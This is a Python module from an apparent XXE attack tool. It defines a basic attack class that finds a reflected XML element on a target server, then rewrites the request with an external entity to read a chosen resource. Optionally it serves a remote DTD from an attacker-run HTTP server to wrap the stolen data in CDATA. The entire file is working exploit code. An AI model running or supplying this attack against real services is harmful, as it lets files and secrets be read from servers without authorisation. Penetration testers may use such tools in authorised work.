from typing import List
from typing import Optional

from ...custom_xml.text_element import XMLTextElement
from .base import BaseXXEAttack
from xeely import console
from xeely.custom_http import HTTPClient
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_http.server import run_http_server
from xeely.custom_xml import XML
from xeely.custom_xml import XMLDoctype
from xeely.custom_xml import XMLEntity
from xeely.xxe.attacks.factory import factory
from xeely.xxe.cdata import CDATA_EXPLOIT_ENTITY_NAME
from xeely.xxe.cdata import get_cdata_dtd_file_url
from xeely.xxe.cdata import get_cdata_entities
from xeely.xxe.errors import ReverseConnectionParamsNotSpecified
from xeely.xxe.strategy import XXEAttackStrategy


@factory.register(name=XXEAttackStrategy.BASIC.value)
class BasicXXEAttack(BaseXXEAttack):
    def __init__(
        self,
        target_url: str,
        xml: XML,
        encode_data_with_base64: bool,
        use_cdata_tag: bool,
        http_server_params: Optional[HTTPServerParams],
    ):
        super().__init__(
            target_url, xml, encode_data_with_base64, use_cdata_tag, http_server_params
        )
        self._vulnerable_element_name = self._get_vulnerable_element_name()

    def _get_vulnerable_element_name(self) -> str:
        console.print_info("Sending request to detect reflected values")

        response = HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())

        console.print_info("Searching for a potential vulnerable text element")
        text_elements = self.get_xml().get_text_elements()
        vulnerable_element: Optional[XMLTextElement] = None

        for text_element in text_elements:
            if text_element.get_value() in response.body:
                console.print_info(
                    f"The content of {text_element.get_name()} is reflected in the response",
                    bold=True,
                )
                vulnerable_element = text_element
                break

        if vulnerable_element is None:
            console.print_warning("We could not find any reflected element in the response")
            exit(0)

        return vulnerable_element.get_name()

    def _run_attack(self) -> str:
        def inner():
            response = HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
            return response.body

        if self.get_use_cdata_tag():
            http_server_params = self.get_http_server_params()

            if http_server_params is None:
                raise ReverseConnectionParamsNotSpecified()

            with run_http_server(http_server_params.get_host(), http_server_params.get_port()):
                data = inner()

        else:
            data = inner()
        return data

    def _configure_xml_for_attack(self, resource: str):
        # Setting doctype
        entities: List[XMLEntity | str] = []

        if self.get_use_cdata_tag():
            http_server_params = self.get_http_server_params()
            if http_server_params is None:
                raise ReverseConnectionParamsNotSpecified()

            remote_entity_name = "remote"
            entities = [
                *entities,
                *get_cdata_entities(resource),
                XMLEntity(
                    _name=remote_entity_name,
                    _value=get_cdata_dtd_file_url(http_server_params),
                    _is_external=True,
                    _is_parameter=True,
                ),
                f"%{remote_entity_name};",
            ]
        else:
            entities = [
                *entities,
                XMLEntity(_name=CDATA_EXPLOIT_ENTITY_NAME, _value=resource, _is_external=True),
            ]

        doctype = XMLDoctype(self._vulnerable_element_name, entities)
        self.get_xml().change_text_element_value(
            self._vulnerable_element_name, f"&{CDATA_EXPLOIT_ENTITY_NAME};"
        )
        self.get_xml().set_doctype(doctype)
